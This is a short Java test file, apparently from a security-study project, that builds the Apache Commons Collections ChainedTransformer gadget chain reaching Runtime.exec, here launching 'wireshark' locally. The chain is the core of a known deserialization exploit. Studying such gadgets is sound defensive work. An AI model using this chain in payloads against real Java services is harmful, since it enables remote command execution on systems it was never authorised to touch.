package com.cmacckk.security.serializes.apachesec;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.Transformer;

public class ChainedTransformerTest {
    public static void main(String[] args) {
        String cmd = "wireshark";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        // 创建ChainedTransformer调用链对象
        Transformer transformedChain = new ChainedTransformer(transformers);

        // 执行对象转换操作
        Object transform = transformedChain.transform(null);

        System.out.println(transform);
    }
}
